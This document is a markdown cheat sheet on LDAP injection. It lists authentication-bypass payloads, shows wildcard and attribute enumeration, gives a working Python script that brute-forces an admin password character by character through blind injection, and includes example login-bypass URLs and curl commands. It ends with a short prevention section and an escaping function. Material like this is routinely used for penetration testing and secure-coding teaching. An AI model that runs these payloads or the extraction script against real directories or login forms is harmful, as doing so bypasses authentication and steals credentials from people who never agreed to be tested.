# LDAP Injection

## Description
LDAP (Lightweight Directory Access Protocol) Injection occurs when user input is incorporated into LDAP queries without proper sanitization. This can lead to authentication bypass, unauthorized data access, and information disclosure.

## LDAP Query Syntax

### Basic Filter Structure
```
(attribute=value)
(&(attribute1=value1)(attribute2=value2))  # AND
(|(attribute1=value1)(attribute2=value2))  # OR
(!(attribute=value))                        # NOT
```

### Common Attributes
```
cn          - Common Name
sn          - Surname
uid         - User ID
mail        - Email
userPassword - Password
objectClass - Object type
givenName   - First name
description - Description
memberOf    - Group membership
```

### Wildcards
```
*           - Matches any characters
(cn=*)      - Matches any cn value
(cn=a*)     - Matches cn starting with 'a'
```

## Authentication Bypass

### Basic Bypass Payloads
```
# Always true condition
*
*)(&
*)(|(&
pwd)
*)(|
*))%00
admin)(&)
admin)(|
```

### User Field Injection
```
# Original query: (&(uid=USER)(userPassword=PASS))

# Injection to bypass password check
USER: admin)(&)
USER: admin)(|(password=*
USER: admin)(!(&(1=0
USER: *)(uid=*))(|(uid=*

# Results in:
(&(uid=admin)(&))(userPassword=anything))
(&(uid=admin)(|(password=*))(userPassword=anything))
```

### Password Field Injection
```
# Original query: (&(uid=admin)(userPassword=PASS))

# Injection payloads
PASS: *)
PASS: *)(uid=*))(|(uid=*

# Results in:
(&(uid=admin)(userPassword=*))
```

### Complete Bypass Examples
```
# Username: *
# Password: *
Query: (&(uid=*)(userPassword=*))
# Matches all users

# Username: admin)(|
# Password: x
Query: (&(uid=admin)(|)(userPassword=x))

# Username: *)(objectclass=*
# Password: test
Query: (&(uid=*)(objectclass=*)(userPassword=test))
```

## Data Extraction

### Attribute Enumeration
```
# Test for attribute existence
(uid=admin)(|(description=*))
(uid=admin)(|(userPassword=*))
(uid=admin)(|(mail=*))
```

### Blind LDAP Injection

#### Character-by-Character Extraction
```
# Extract password character by character
(uid=admin)(userPassword=a*)
(uid=admin)(userPassword=b*)
(uid=admin)(userPassword=c*)
...

# If starts with 'p':
(uid=admin)(userPassword=pa*)
(uid=admin)(userPassword=pb*)
...
```

#### Python Script for Blind Extraction
```python
import requests

url = "https://target.com/login"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

while True:
    found = False
    for c in chars:
        payload = f"admin)(userPassword={password}{c}*"
        response = requests.post(url, data={"username": payload, "password": "x"})

        if "Welcome" in response.text:  # Successful auth
            password += c
            print(f"[+] Found: {password}")
            found = True
            break

    if not found:
        break

print(f"[+] Password: {password}")
```

### Using Wildcards for Data Discovery
```
# Find all users
(uid=*)

# Find users with email
(&(uid=*)(mail=*))

# Find admins
(&(uid=*)(memberOf=cn=admins,*))

# Find users with specific domain email
(&(uid=*)(mail=*@company.com))
```

## Filter Bypass Techniques

### Null Byte Injection
```
admin)%00
admin)\x00
```

### Unicode Encoding
```
# Encode special characters
%28 = (
%29 = )
%2a = *
%5c = \
```

### Nested Filters
```
(&(uid=admin)(|(objectclass=*)))
(|(uid=admin)(&(objectclass=*)))
```

## Common Vulnerable Parameters
```
username
user
uid
login
name
cn
email
search
query
filter
ldap_search
dn
```

## Exploitation Scenarios

### Scenario 1: Login Bypass
```
URL: https://target.com/login
POST: username=admin)(&)&password=anything

# Or via GET
https://target.com/login?username=admin)(%26)&password=x
```

### Scenario 2: Search Function
```
# Original: (cn=USER_INPUT)
# Injection to list all users
https://target.com/search?name=*)

# Injection to find admins
https://target.com/search?name=*)(memberOf=cn=admin*)(&
```

### Scenario 3: Email Lookup
```
# Original: (mail=USER_INPUT)
https://target.com/lookup?email=*@company.com)(uid=*
```

## Detection

### Error-Based
```
# Send malformed filter
username=(
username=)
username=\
username=*))

# Look for LDAP error messages
```

### Boolean-Based
```
# Compare responses
username=admin        # Normal
username=admin)(|(    # Modified - if different, might be vulnerable
```

### Time-Based
```
# Less common in LDAP, but possible with specific implementations
```

## Testing Checklist

- [ ] Test special characters: *, (, ), \, &, |
- [ ] Test null byte injection
- [ ] Test authentication bypass payloads
- [ ] Test blind injection for data extraction
- [ ] Check error messages for LDAP info
- [ ] Test wildcard queries
- [ ] Test Unicode encoding

## Tools

### Manual Testing
```bash
# Using curl
curl -X POST "https://target.com/login" \
    -d "username=admin)(%26)&password=test"
```

### LDAP Client Tools
```bash
# ldapsearch for testing
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(uid=admin)"
```

## Prevention

```
1. Use parameterized LDAP queries
2. Escape special characters: * ( ) \ NUL
3. Validate input against whitelist
4. Use least privilege for LDAP connections
5. Implement proper error handling
6. Use LDAP libraries with built-in escaping
```

### Escaping Function (Python)
```python
import ldap

def escape_ldap_filter(value):
    # Escape special characters
    return ldap.filter.escape_filter_chars(value)

# Or manual escaping
def escape_manual(s):
    escapes = {
        '\\': r'\5c',
        '*': r'\2a',
        '(': r'\28',
        ')': r'\29',
        '\x00': r'\00'
    }
    for char, escape in escapes.items():
        s = s.replace(char, escape)
    return s
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
- https://owasp.org/www-community/attacks/LDAP_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
